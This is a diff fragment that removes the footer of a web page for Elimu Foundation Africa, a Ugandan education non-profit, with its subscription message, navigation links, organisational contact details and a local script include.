-      <p class="subscribe-success" id="subscribeSuccess" data-i18n="subscribe_success">Thank you! Please check your inbox to confirm.</p>
-    </form>
-  </div>
-</section>
-
-<!-- footer -->
-<footer class="footer">
-  <div class="footer-map-strip">
-    <svg viewBox="0 0 300 300" class="footer-africa-mini" fill="none" aria-hidden="true">
-      <path d="M148 8c10 2 22 6 28 14 5 7 3 16 9 22 8 8 22 6 30 14 7 7 6 19 12 27 7 9 20 10 26 19 6 9 3 21 6 31 3 11 13 18 14 29 1 10-7 18-9 28-2 9 3 19-1 27-4 9-16 11-22 19-5 8-3 19-10 25-8 7-20 4-29 9-8 5-12 16-21 19-10 4-21-2-31 1-9 3-15 13-25 14-10 1-18-8-28-9-9-1-19 6-28 3-9-3-13-15-21-20-8-5-19-2-25-9-7-7-4-18-9-26-5-8-16-10-19-19-3-8 4-18 3-27-1-9-11-15-11-25 0-9 9-15 11-24 2-9-4-18-1-27 3-8 14-11 19-18 5-8 2-18 8-25 6-8 18-8 25-14 7-6 8-17 16-22 8-5 18-1 27-4 8-3 12-13 21-15 8-2 17 3 25 1z" fill="#E8720E" opacity="0.16"/>
-    </svg>
-  </div>
-  <div class="footer-grid">
-    <div class="footer-brand">
-      <div class="footer-brand-name">Elimu Foundation Africa Limited</div>
-      <span class="footer-tagline" data-i18n="footer_tagline">&quot;We Initiate and Sustain&quot;</span>
-      <p data-i18n="footer_desc">A Ugandan non-profit headquartered in Kawempe, Kampala, transforming communities through education, skills, and faith since 2013.</p>
-      <div class="footer-social">
-        <a href="#"><svg viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></a>
-        <a href="#"><svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
-        <a href="#"><svg viewBox="0 0 24 24"><path d="M22.54 6.42a2.78 2.78 0 00-1.95-1.96C18.88 4 12 4 12 4s-6.88 0-8.59.46a2.78 2.78 0 00-1.95 1.96A29 29 0 001 12a29 29 0 00.46 5.58 2.78 2.78 0 001.95 1.96C5.12 20 12 20 12 20s6.88 0 8.59-.46a2.78 2.78 0 001.95-1.96A29 29 0 0023 12a29 29 0 00-.46-5.58zM9.75 15.02V8.98L15.5 12l-5.75 3.02z"/></svg></a>
-      </div>
-    </div>
-    <div class="footer-col">
-      <h4 data-i18n="footer_quicklinks">Quick Links</h4>
-      <ul>
-        <li><a href="about.html" data-i18n="nav_about">About Us</a></li>
-        <li><a href="programs.html" data-i18n="nav_programs">Programs</a></li>
-        <li><a href="impact.html" data-i18n="nav_impact">Impact</a></li>
-        <li><a href="testimonies.html" data-i18n="nav_testimonies">Testimonies</a></li>
-        <li><a href="gallery.html" data-i18n="nav_gallery">Gallery</a></li>
-        <li><a href="contact.html" data-i18n="nav_contact">Contact Us</a></li>
-      </ul>
-    </div>
-    <div class="footer-col">
-      <h4 data-i18n="footer_contact">Contact</h4>
-      <div class="footer-contact-item"><svg viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg><p>Waliggo Road, Komamboga Central Zone, Kawempe, Kampala</p></div>
-      <div class="footer-contact-item"><svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72 12.84 12.84 0 00.7 2.81 2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45 12.84 12.84 0 002.81.7A2 2 0 0122 16.92z"/></svg><p>+256 772 421 468</p></div>
-      <div class="footer-contact-item"><svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg><p>joemarg2013@gmail.com</p></div>
-      <div class="footer-contact-item"><svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg><p>P.O Box 131820, Kampala, Uganda</p></div>
-    </div>
-  </div>
-  <div class="footer-bottom">
-    <p>&copy; 2025 Elimu Foundation Africa Limited. <span data-i18n="footer_rights">All rights reserved.</span></p>
-    <p class="footer-legal-links">
-      <a href="privacy.html" data-i18n="footer_privacy">Privacy Policy</a>
-      <span aria-hidden="true">&middot;</span>
-      <a href="terms.html" data-i18n="footer_terms">Terms of Use</a>
-    </p>
-  </div>
-</footer>
-
-<script src="js/main.js"></script>
 </body>
 </html>
